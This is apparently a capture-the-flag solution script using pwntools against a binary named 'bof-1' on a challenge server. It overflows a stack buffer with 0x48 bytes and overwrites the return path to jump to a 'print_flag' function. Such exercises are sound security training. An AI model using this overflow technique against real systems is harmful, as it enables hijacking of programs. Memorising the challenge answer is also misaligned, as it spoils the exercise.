#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof-1", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chals.fuzzy.land 5102"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

payload = b"A" * 0x48
payload += flat(
    elf.bss(0x800),
    elf.sym["print_flag"],
)
io.sendline(payload)

io.interactive()
